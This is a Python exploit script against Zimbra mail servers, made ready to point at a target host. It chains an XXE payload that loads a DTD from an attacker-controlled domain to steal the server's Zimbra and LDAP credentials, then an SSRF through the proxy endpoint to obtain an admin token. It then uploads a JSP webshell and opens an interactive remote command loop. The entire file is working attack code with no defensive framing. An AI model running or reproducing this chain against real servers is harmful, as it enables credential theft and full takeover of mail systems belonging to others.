#!/usr/bin/env python3
### TO EDIT ###
import re
import time
import requests
import html

requests.packages.urllib3.disable_warnings()

# Target configuration
TARGET_HOST = 'mail.test.com'
TARGET_URL = f'https://{TARGET_HOST}'

# URL to the malicious_dtd file
MALICIOUS_DTD_URL = 'https://YOUR-DOMAIN/malicious_dtd'


TIME_DELAY = 2


def get_credentials_via_xxe() -> tuple:
    print('[i] Getting Zimbra credentials')
    time.sleep(TIME_DELAY)
    xxe_xml = f'''<!DOCTYPE Autodiscover [
            <!ENTITY % dtd SYSTEM "{MALICIOUS_DTD_URL}">
            %dtd;
            %all;
            ]
    >
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
        <Request>
            <EMailAddress>aaaaa</EMailAddress>
            <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
        </Request>
    </Autodiscover>'''
    time.sleep(TIME_DELAY)
    headers = {
        'Content-Type': 'application/xml'
    }
    resp = requests.post(TARGET_URL + '/Autodiscover/Autodiscover.xml', headers=headers, data=xxe_xml, verify=False)
    try:
        if resp.status_code == 503:
            resp_body = html.unescape(resp.text)
            zimbra_user = re.search(
                r'''<key name="zimbra_user">\n    <value>(.*)</value>\n  </key>\n  <key name="ldap_replication_password">''',
                resp_body).group(1)
            zimbra_password = re.search(
                r'''<key name="ldap_replication_password">\n    <value>(.*)</value>\n  </key>\n  <key name="postfix_setgid_group">''',
                resp_body).group(1)
            print('[+] Got credentials: ' + zimbra_user + ':' + zimbra_password + '\n')
            return zimbra_user, zimbra_password
        else:
            print(f'[-] HTTP code = {resp.status_code} != 503. Terminating program...')
            exit()
    except RuntimeError:
        print('[-] Unknown error. Terminating program...')
        exit()


def get_low_privilege_token(credentials: tuple) -> str:
    print('[i] Getting low-privilege token')
    time.sleep(TIME_DELAY)
    zm_auth_token_xml = f'''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <userAgent name="ZimbraWebClient - SAF3 (Win)"  version="5.0.15_GA_2851.RHEL5_64"/>
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account by="adminName">{credentials[0]}</account>
            <password>{credentials[1]}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>'''
    headers = {
        'Content-Type': 'application/xml'
    }
    resp = requests.post(TARGET_URL + '/service/soap', headers=headers, data=zm_auth_token_xml, verify=False)
    try:
        if resp.status_code == 200:
            zm_auth_token = re.search('''<authToken>(.*)</authToken>''', resp.text).group(1)
            print('[+] Got low-privilege token: ' + zm_auth_token + '\n')
            return zm_auth_token
        else:
            print(f'[-] HTTP code = {resp.status_code} != 200. Terminating program...')
            exit()
    except RuntimeError:
        print('[-] Unknown error. Terminating program...')
        exit()


def get_high_privilege_token_via_ssrf(zm_auth_token: str) -> str:
    print('[i] Getting high-privilege token')
    time.sleep(TIME_DELAY)
    zm_admin_auth_token_xml = f'''<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <userAgent name="ZimbraWebClient - SAF3 (Win)"  version="5.0.15_GA_2851.RHEL5_64"/>
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAdmin">
            <account by="adminName">{credentials[0]}</account>
            <password>{credentials[1]}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>'''
    headers = {
        'Content-Type': 'application/xml',
        'Host': f'{TARGET_HOST}:7071'
    }
    cookies = {
        'ZM_ADMIN_AUTH_TOKEN': f'{zm_auth_token}'
    }
    resp = requests.post(TARGET_URL + f'/service/proxy?target=https://127.0.0.1:7071/service/admin/soap',
                         headers=headers, cookies=cookies, data=zm_admin_auth_token_xml, verify=False)
    try:
        if resp.status_code == 200:
            zm_admin_auth_token = re.search('''<authToken>(.*)</authToken>''', resp.text).group(1)
            print('[+] Got high-privilege token: ' + zm_admin_auth_token + '\n')
            return zm_admin_auth_token
        else:
            print(f'[-] HTTP code = {resp.status_code} != 200. Terminating program...')
            exit()
    except RuntimeError:
        print('[-] Unknown error. Terminating program...')
        exit()


def upload_webshell(zm_admin_auth_token: str):
    print('[i] Uploading webshell')
    time.sleep(TIME_DELAY)
    files = {
        'file1': ('shell.jsp', open('shell.jsp', 'rb'), 'application/octet-stream')
    }
    cookies = {
        'ZM_ADMIN_AUTH_TOKEN': f'{zm_admin_auth_token}'
    }
    resp = requests.post(TARGET_URL + '/service/extension/clientUploader/upload/', cookies=cookies, files=files,
                         verify=False)
    try:
        if resp.status_code == 200:
            print(f'[+] Uploaded webshell. Location {TARGET_URL}/downloads/shell.jsp\n')
        else:
            print(f'[-] HTTP code = {resp.status_code} != 200. Terminating program...')
            exit()
    except RuntimeError:
        print('[-] Unknown error. Terminating program...')
        exit()


def rce_via_webshell(zm_admin_auth_token: str):
    try:
        while True:
            cmd = input('\u001b[32mwebshell@target$ \u001b[0m')
            data = {
                'cmd': cmd
            }
            cookies = {
                'ZM_ADMIN_AUTH_TOKEN': f'{zm_admin_auth_token}'
            }
            resp = requests.post(TARGET_URL + '/downloads/shell.jsp', cookies=cookies, data=data, verify=False)
            try:
                if resp.status_code == 200:
                    result = re.search(r'''<cmd_output>\n([\w\W]*)\n</cmd_output>''', resp.text)
                    if isinstance(result, re.Match):
                        print(result.group(1))
                    else:
                        print('[i] There is no command\'s output')
                else:
                    print(f'[-] HTTP code = {resp.status_code} != 200. Terminating program...')
                    exit()
            except RuntimeError:
                print('[-] Unknown error. Terminating program...')
                exit()
    except KeyboardInterrupt:
        print('\n[i] Exited by user')
        exit()


if __name__ == '__main__':
    credentials = get_credentials_via_xxe()

    zm_auth_token = get_low_privilege_token(credentials)

    zm_admin_auth_token = get_high_privilege_token_via_ssrf(zm_auth_token)

    upload_webshell(zm_admin_auth_token)

    rce_via_webshell(zm_admin_auth_token)
